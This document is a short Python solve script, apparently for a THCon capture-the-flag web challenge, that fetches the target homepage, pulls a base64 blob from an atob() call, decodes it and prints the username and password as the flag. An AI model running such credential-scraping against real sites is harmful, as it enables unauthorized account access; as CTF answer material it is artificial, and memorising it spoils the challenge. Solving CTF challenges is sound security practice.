#!/usr/bin/env python3
import base64
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qs
from urllib.request import Request, urlopen


TARGET = "http://panic-in-the-northern-quadrant.ctf.thcon.party:8080/"


def fetch(url: str) -> str:
    req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urlopen(req, timeout=10) as resp:
        return resp.read().decode("utf-8", errors="replace")


def main() -> int:
    try:
        html = fetch(TARGET)
    except (HTTPError, URLError) as exc:
        print(f"[!] failed to fetch target: {exc}", file=sys.stderr)
        return 1

    match = re.search(r'atob\("([A-Za-z0-9+/=]+)"\)', html)
    if not match:
        print("[!] base64 blob not found in homepage source", file=sys.stderr)
        return 1

    decoded = base64.b64decode(match.group(1)).decode()
    params = parse_qs(decoded, keep_blank_values=True)
    username = params.get("username", [""])[0]
    password = params.get("password", [""])[0]

    if not password:
        print("[!] password not found after decoding", file=sys.stderr)
        return 1

    print(f"[+] username = {username}")
    print(f"[+] password = {password}")
    print(f"<FLAG>{password}</FLAG>")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
